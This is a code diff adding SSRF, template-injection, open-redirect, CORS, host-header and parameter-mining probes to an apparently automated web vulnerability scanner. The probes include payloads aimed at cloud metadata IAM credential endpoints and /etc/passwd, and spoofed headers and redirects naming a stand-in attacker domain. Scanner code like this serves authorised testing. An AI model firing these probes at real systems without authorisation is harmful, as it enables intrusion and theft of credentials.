@@ -40,6 +40,32 @@ ARCHIVE_SKIP_EXT = (
     ".mp4", ".webm", ".mp3", ".pdf", ".zip", ".gz", ".tar", ".rar",
 )
 
+# Parameter names that commonly carry a redirect target (open-redirect probe).
+REDIRECT_PARAMS = {
+    "url", "next", "redirect", "redir", "return", "returnurl", "return_url",
+    "dest", "destination", "continue", "goto", "go", "r", "u", "link", "out",
+    "target", "redirect_uri", "callback", "checkout_url", "forward", "to",
+}
+
+# Parameter names that commonly carry a URL the server fetches (SSRF probe).
+SSRF_PARAMS = {
+    "url", "uri", "path", "dest", "destination", "redirect", "link", "src",
+    "source", "target", "host", "site", "domain", "callback", "feed", "file",
+    "page", "proxy", "fetch", "load", "image", "img", "open", "to", "out",
+    "view", "remote", "api", "endpoint", "data", "reference", "ref",
+}
+
+# High-signal candidate names for active parameter mining (arjun style).
+PARAM_MINE_CANDIDATES = [
+    "id", "page", "file", "dir", "path", "url", "redirect", "next", "q", "s",
+    "search", "query", "user", "username", "email", "debug", "test", "admin",
+    "cmd", "exec", "action", "view", "include", "template", "lang", "callback",
+    "return", "data", "key", "token", "format", "type", "mode", "step", "order",
+    "sort", "field", "filter", "start", "limit", "offset", "ref", "source",
+    "target", "dest", "preview", "download", "doc", "report", "print", "export",
+    "import", "name", "value", "content", "message", "comment", "title", "body",
+]
+
 
 class OffensiveEngine:
     """Mixed into Ares. Expects the host to provide: self.run_command, self.log,
@@ -524,6 +550,248 @@ class OffensiveEngine:
                        "success" if findings else "info")
         return findings
 
+    # ── Generic single-parameter probe ───────────────────────────
+    async def _param_probe(self, urls, payloads, detector, name_filter=None,
+                           cap=30, per_params=3, follow=True) -> list:
+        """For each parameterized URL, replace one parameter at a time with each
+        payload, request it, and run detector(payload, response) -> dict|None.
+        Shared by the SSRF, SSTI and open-redirect probes."""
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        import httpx
+
+        param_urls = [u for u in urls if "?" in u and "=" in u][:cap]
+        findings, seen = [], set()
+        if not param_urls:
+            return findings
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=follow,
+                                     headers=self._auth_headers()) as c:
+            for u in param_urls:
+                parsed = urlparse(u)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                names = [n for n in params if (name_filter is None or n.lower() in name_filter)]
+                for pname in names[:per_params]:
+                    key = (parsed.netloc, parsed.path, pname.lower())
+                    if key in seen:
+                        continue
+                    seen.add(key)
+                    for pl in payloads:
+                        mutated = dict(params)
+                        mutated[pname] = [pl]
+                        target = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
+                        try:
+                            r = await c.get(target)
+                        except Exception:
+                            continue
+                        verdict = detector(pl, r)
+                        if verdict:
+                            findings.append({"param": pname, "url": u, "payload": pl})
+                            await self.add_finding(
+                                title=f"{verdict['title']}: {pname}",
+                                severity=verdict["severity"],
+                                description=verdict["description"],
+                                evidence=f"URL: {u}\nParameter: {pname}\nPayload: {pl}\n{verdict.get('evidence','')}",
+                                cvss_score=verdict["cvss"],
+                                remediation=verdict["remediation"],
+                            )
+                            break
+        return findings
+
+    # ── SSRF (in-band: cloud metadata / file read) ───────────────
+    async def test_ssrf(self, urls: list) -> list:
+        await self.log("Probing parameters for SSRF (cloud metadata / file read)", "info")
+        canaries = [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.google.internal/computeMetadata/v1/instance/",
+            "file:///etc/passwd",
+        ]
+        aws_gcp = ("security-credentials", "ami-id", "instance-id", "iam/",
+                   "computeMetadata", "project-id", "meta-data")
+
+        def det(pl, r):
+            body = r.text or ""
+            if pl.startswith("file:"):
+                m = re.search(r"root:.*?:0:0:", body)
+                if m:
+                    return {"title": "Server-Side Request Forgery (file read)", "severity": "high",
+                            "cvss": 8.6,
+                            "description": "A URL parameter fetched a local file via the file:// scheme, "
+                                           "confirming server-side request forgery with local file read.",
+                            "remediation": "Allowlist outbound URL schemes/hosts; block file:// and internal "
+                                           "addresses; resolve and validate the target before fetching.",
+                            "evidence": f"Leaked: {m.group(0)[:120]}"}
+                return None
+            if any(s in body for s in aws_gcp):
+                return {"title": "Server-Side Request Forgery (cloud metadata)", "severity": "high",
+                        "cvss": 8.6,
+                        "description": "A URL parameter caused the server to fetch a cloud metadata endpoint, "
+                                       "exposing instance metadata and potentially IAM credentials.",
+                        "remediation": "Block requests to link-local/metadata IPs (169.254.169.254), enforce "
+                                       "IMDSv2, and allowlist outbound hosts.",
+                        "evidence": "Cloud metadata signature reflected in the response body."}
+            return None
+
+        f = await self._param_probe(urls, canaries, det, name_filter=SSRF_PARAMS, cap=30, follow=True)
+        await self.log(f"SSRF probing complete: {len(f)} confirmed", "success" if f else "info")
+        return f
+
+    # ── SSTI (template evaluation) ───────────────────────────────
+    async def test_ssti(self, urls: list) -> list:
+        await self.log("Probing parameters for server-side template injection", "info")
+        marker = "1787569"  # 1337*1337, distinctive so a natural match is unlikely
+        payloads = ["${1337*1337}", "{{1337*1337}}", "<%= 1337*1337 %>", "#{1337*1337}",
+                    "${{1337*1337}}", "*{1337*1337}"]
+
+        def det(pl, r):
+            if marker in (r.text or ""):
+                return {"title": "Server-Side Template Injection", "severity": "high", "cvss": 9.0,
+                        "description": "A template expression injected into this parameter was evaluated "
+                                       "server-side (1337*1337 rendered as 1787569), confirming SSTI. "
+                                       "This frequently leads to remote code execution.",
+                        "remediation": "Never pass user input into template engines. Use logic-less "
+                                       "templates or strict sandboxing and context-aware escaping.",
+                        "evidence": "Template expression evaluated to 1787569 in the response."}
+            return None
+
+        f = await self._param_probe(urls, payloads, det, name_filter=None, cap=30, follow=True)
+        await self.log(f"SSTI probing complete: {len(f)} confirmed", "success" if f else "info")
+        return f
+
+    # ── Open redirect ────────────────────────────────────────────
+    async def test_open_redirect(self, urls: list) -> list:
+        await self.log("Probing redirect parameters for open redirect", "info")
+        evil = "evil-olympus.example"
+        payloads = [f"https://{evil}", f"//{evil}", f"https:/{evil}", f"/\\{evil}"]
+
+        def det(pl, r):
+            loc = r.headers.get("location", "")
+            # The attacker host is a made-up domain, so its presence in the
+            # redirect target is itself proof the parameter controls the redirect.
+            if loc and evil in loc.lower():
+                return {"title": "Open Redirect", "severity": "medium", "cvss": 5.4,
+                        "description": "A redirect parameter sent the browser to an attacker-controlled "
+                                       "external domain, enabling phishing and OAuth token theft.",
+                        "remediation": "Allowlist redirect targets or use relative paths only; never redirect "
+                                       "to a raw user-supplied URL.",
+                        "evidence": f"Location: {loc[:200]}"}
+            return None
+
+        f = await self._param_probe(urls, payloads, det, name_filter=REDIRECT_PARAMS,
+                                    cap=40, follow=False)
+        await self.log(f"Open-redirect probing complete: {len(f)} confirmed", "success" if f else "info")
+        return f
+
+    # ── CORS misconfiguration ────────────────────────────────────
+    async def test_cors(self, base_url: str, urls: list) -> list:
+        import httpx
+        await self.log("Testing CORS policy for arbitrary-origin reflection", "info")
+        evil = "https://evil-olympus.example"
+        targets = list(dict.fromkeys([base_url] + [u for u in urls if "/api" in u or "?" not in u]))[:20]
+        findings = []
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False,
+                                     headers=self._auth_headers()) as c:
+            for u in targets:
+                try:
+                    r = await c.get(u, headers={"Origin": evil})
+                except Exception:
+                    continue
+                acao = r.headers.get("access-control-allow-origin", "")
+                acac = r.headers.get("access-control-allow-credentials", "").lower()
+                if acao == evil:
+                    sev = "high" if acac == "true" else "medium"
+                    cvss = 7.4 if acac == "true" else 5.3
+                    findings.append({"url": u, "creds": acac == "true"})
+                    await self.add_finding(
+                        title=f"CORS Misconfiguration (reflected origin{' + credentials' if acac == 'true' else ''})",
+                        severity=sev,
+                        description="The server reflects an arbitrary Origin in Access-Control-Allow-Origin"
+                                    + (" with Access-Control-Allow-Credentials: true, letting any site read "
+                                       "authenticated responses (account takeover)." if acac == "true"
+                                       else ", allowing any site to read the response."),
+                        evidence=f"URL: {u}\nOrigin: {evil}\nAccess-Control-Allow-Origin: {acao}\n"
+                                 f"Access-Control-Allow-Credentials: {acac or '(unset)'}",
+                        cvss_score=cvss,
+                        remediation="Reflect only an allowlist of trusted origins; never combine a reflected "
+                                    "origin with credentials; avoid dynamic ACAO based on the Origin header.",
+                    )
+        await self.log(f"CORS testing complete: {len(findings)} misconfiguration(s)",
+                       "success" if findings else "info")
+        return findings
+
+    # ── Host header injection ────────────────────────────────────
+    async def test_host_header(self, base_url: str) -> list:
+        import httpx
+        await self.log("Testing for host header injection / poisoning", "info")
+        evil = "evil-olympus.example"
+        findings = []
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False,
+                                     headers=self._auth_headers()) as c:
+            for hdr in ("Host", "X-Forwarded-Host"):
+                try:
+                    r = await c.get(base_url, headers={hdr: evil})
+                except Exception:
+                    continue
+                loc = r.headers.get("location", "")
+                body = (r.text or "")[:4000]
+                if evil in loc or evil in body:
+                    findings.append({"header": hdr})
+                    await self.add_finding(
+                        title=f"Host Header Injection ({hdr})",
+                        severity="medium",
+                        description="A spoofed host header was reflected into a redirect or the response body. "
+                                    "This enables web-cache poisoning and password-reset link poisoning "
+                                    "(account takeover via reset emails pointing at an attacker domain).",
+                        evidence=f"{hdr}: {evil}\nReflected in: {'Location header' if evil in loc else 'response body'}",
+                        cvss_score=6.1,
+                        remediation="Validate the Host header against an allowlist; build absolute URLs from a "
+                                    "configured canonical hostname, never from the request Host/X-Forwarded-Host.",
+                    )
+                    break
+        await self.log(f"Host-header testing complete: {len(findings)} finding(s)",
+                       "success" if findings else "info")
+        return findings
+
+    # ── Active parameter mining (arjun style) ────────────────────
+    async def mine_params(self, base_url: str) -> list:
+        """Discover hidden parameters the app processes by probing candidate names
+        and watching for the injected value being reflected. Returns synthesized
+        param URLs so the injection probes then test the newly found params."""
+        import httpx
+
+        canary = "olymz9x7q"
+        try:
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                base = await c.get(base_url)
+                base_reflects = canary in (base.text or "")
+                if base_reflects:
+                    return []  # site echoes anything; reflection test is meaningless
+
+                sem = asyncio.Semaphore(20)
+                sep = "&" if "?" in base_url else "?"
+
+                async def probe(cand):
+                    async with sem:
+                        try:
+                            r = await c.get(f"{base_url}{sep}{cand}={canary}")
+                        except Exception:
+                            return None
+                        return cand if canary in (r.text or "") else None
+
+                results = await asyncio.gather(*[probe(cand) for cand in PARAM_MINE_CANDIDATES])
+        except Exception:
+            return []
+
+        found = [c for c in results if c]
+        if not found:
+            await self.log("Param mining: no hidden reflected parameters", "info")
+            return []
+        await self.log(
+            f"Param mining: {len(found)} hidden reflected parameter(s): {', '.join(found[:15])}",
+            "success",
+        )
+        sep = "&" if "?" in base_url else "?"
+        return [f"{base_url}{sep}{c}=1" for c in found]
+
     # ── OWASP ZAP active scan (full DAST) ────────────────────────
     async def zap_active_scan(self, base_url: str, seed_urls: list = None) -> list:
         import httpx
@@ -706,24 +974,31 @@ class OffensiveEngine:
             await self.log(
                 f"⚠ Authenticated scanning requested but login failed on {base_url}; "
                 f"testing the UNAUTHENTICATED surface only", "warn")
-        # Active crawl (katana) + passive archive discovery (Wayback), then
-        # collapse duplicate parameter sets so each endpoint+params is tested once.
+        # Attack surface = active crawl (katana) + passive archive discovery
+        # (Wayback) + active param mining (arjun style), collapsed by param set.
         crawled = await self.crawl(base_url)
         archived = await self.gather_archive_urls(base_url)
-        urls = self._dedupe_by_params(list(dict.fromkeys(crawled + archived)))
+        mined = await self.mine_params(base_url)
+        urls = self._dedupe_by_params(list(dict.fromkeys(crawled + archived + mined)))
         params = len([u for u in urls if "?" in u and "=" in u])
         await self.log(
             f"Attack surface: {len(urls)} unique endpoints ({params} parameterized) "
-            f"from crawl + archives", "info")
+            f"from crawl + archives + param mining", "info")
 
-        # Run injection classes concurrently where safe
-        sqli, xss, dast, auth, trav, disco = await asyncio.gather(
+        # Run injection / access-control classes concurrently where safe.
+        (sqli, xss, dast, auth, trav, disco,
+         ssrf, ssti, oredir, cors, hosthdr) = await asyncio.gather(
             self.test_sqli(urls),
             self.test_xss(urls),
             self.nuclei_dast(urls),
             self.test_auth(base_url, urls),
             self.test_path_traversal(urls),
             self.content_discovery(base_url, extra_wordlists),
+            self.test_ssrf(urls),
+            self.test_ssti(urls),
+            self.test_open_redirect(urls),
+            self.test_cors(base_url, urls),
+            self.test_host_header(base_url),
             return_exceptions=True,
         )
 
@@ -743,7 +1018,13 @@ class OffensiveEngine:
             "traversal": _safe(trav),
             "zap": _safe(zap),
             "content": _safe(disco),
+            "ssrf": _safe(ssrf),
+            "ssti": _safe(ssti),
+            "open_redirect": _safe(oredir),
+            "cors": _safe(cors),
+            "host_header": _safe(hosthdr),
         }
-        total = sum(len(_safe(v)) for v in (sqli, xss, dast, auth, trav, zap))
+        total = sum(len(_safe(v)) for v in
+                    (sqli, xss, dast, auth, trav, zap, ssrf, ssti, oredir, cors, hosthdr))
         await self.log(f"⚔ Offensive engine complete: {total} injection/access/DAST findings across {len(urls)} URLs", "success")
         return result
